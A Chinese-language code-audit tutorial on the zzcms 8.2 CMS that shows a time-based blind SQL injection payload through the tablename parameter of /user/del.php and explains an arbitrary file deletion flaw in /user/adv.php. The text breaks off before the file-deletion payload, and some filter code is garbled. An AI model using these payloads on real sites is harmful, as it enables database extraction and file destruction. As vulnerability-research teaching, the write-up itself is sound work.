### 前言
代码审计，最重要的就是多读代码，对用户与网站交互的地方要特别注意。在进行审计时，我们也可以使用一些审计工具来辅助我们进行工作，从而提高效率。下面，笔者将分享审计zzcms8.2的过程，与大家一起学习。这里，笔者使用
**seay源代码审计系统** 软件进行辅助工作。
### 审计流程
首先，笔者打开 **seay源代码审计系统**
软件，将要审计的网站源码导入项目，然后点击自动审计。当审计完成时，我们需要根据自动审计的结果，进行逐一验证。当然，我们不需要真的每个文件都打开看过去，可以根据扫描报告中的漏洞详细信息来判断是否可能存在漏洞，如果你觉的某个地方可能存在，这时，你再打开具体文件查看。
如果你想查询某个变量或者函数在代码中的具体位置，你也可以使用全局定位搜索，该软件会快速地定位找出具体文件，这一功能大大加快了我们审计的速度。对于来自用户的数据以及后端对数据库的操作，我们要特别注意。下面笔者介绍zzcms8.2的审计过程。
### 代码审计实例：zzcms8.2
#### sql注入漏洞
首先，" **/user/del.php** "开头两行包含了两个文件" **/inc/conn.php** "、" **/user/check.php**
"，而" **/inc/conn.php** "又包含了一些文件，其中要关注的是" **/inc/function.php** "和"
**/inc/stopsqlin.php** "。其中" **/inc/function.php** "提供了一些关键的功能函数，而"
**/inc/stopsqlin.php** "则是防止sql注入的。
    # "/user/conn.php"文件
    include(zzcmsroot."/inc/config.php");
    include(zzcmsroot."/inc/wjt.php");
    include(zzcmsroot."/inc/function.php");
    include(zzcmsroot."/inc/zsclass.php");
    include(zzcmsroot."/inc/stopsqlin.php");
    include(zzcmsroot."/inc/area.php");
包含" **/inc/stopsqlin.php** "文件，则会对REQUEST的数据进行过滤，具体代码如下
    # "/user/stopsqlin.php"文件
    function zc_check($string){
        if(!is_array($string)){
            if(get_magic_quotes_gpc()){
            return htmlspecialchars(trim($string));
            }else{
            return addslashes(htmlspecialchars(trim($string)));
            }
         }
        foreach($string as $k => $v) $string[$k] = zc_check($v);
        return $string;
    }
    if($_REQUEST){
        $_POST =zc_check($_POST);
        $_GET =zc_check($_GET);
        $_COOKIE =zc_check($_COOKIE);
        @extract($_POST);
        @extract($_GET);    
    }
    function nostr($str){
        $sql_injdata = "',/,\,,";
        $sql_inj = explode(",",$sql_injdata);
        for ($i=0; $i0)
        $sql="select id,editor from ".$tablename." where id in (". $id .")";
    else
        $sql="select id,editor from ".$tablename." where id ='$id'";
作者 **vr_system** 于2018-02-07发表了 **ZZCMS v8.2 最新版SQL注入漏洞**
()
一文，文中使用的payload为：`id=1&tablename=zzcms_answer where id = 1 and
if((ascii(substr(user(),1,1)) =121),sleep(5),1)#`
但是这并不是一个通用payload，因为如果zzcms_answer是一个空表，则该payload无法利用，所以我们改进一下，payload改成如下即可，这里注意不能使用大于号、小于号，因为post上来的数据被addslashes()、htmlspecialchars()、trim()三个函数消毒处理过了。
    id=1&tablename=zzcms_answer where id=999999999 union select 1,2 and if((ascii(substr(user(),1,1)) = 114),sleep(3),1)#
在" **/user/logincheck.php** "、" **/admin/logincheck.php**
"中也存在多处由ip导致的sql注入，这里就不一一列举了。
#### 任意文件删除漏洞
该漏洞发生在80多行处的`$f`变量，该变量直接由`"../"`与`$oldimg`拼接而得，并未过滤`.`和`/`字符，导致跨目录删除文件。所以按照代码逻辑，我们只要让`$img`不等于`$oldimg`，且`$action`等于"modify"即可。
    # "/user/adv.php"文件
    .......
    if (isset($_REQUEST["img"])){
        $img=$_REQUEST["img"];
    }else{
        $img="";
    }
    if (isset($_REQUEST["oldimg"])){
        $oldimg=$_REQUEST["oldimg"];
    }
    else{
        $oldimg="";
    }
    .......
    if ($action=="modify"){
      query("update zzcms_textadv set adv='$adv',company='$company',advlink='$advlink',img='$img',passed=0 where username='".$_COOKIE["UserName"]."'");
      if ($oldimg<>$img){
          $f="../".$oldimg;
          if (file_exists($f)){
            unlink($f);
          }
      }
      .......
    }
payload如下：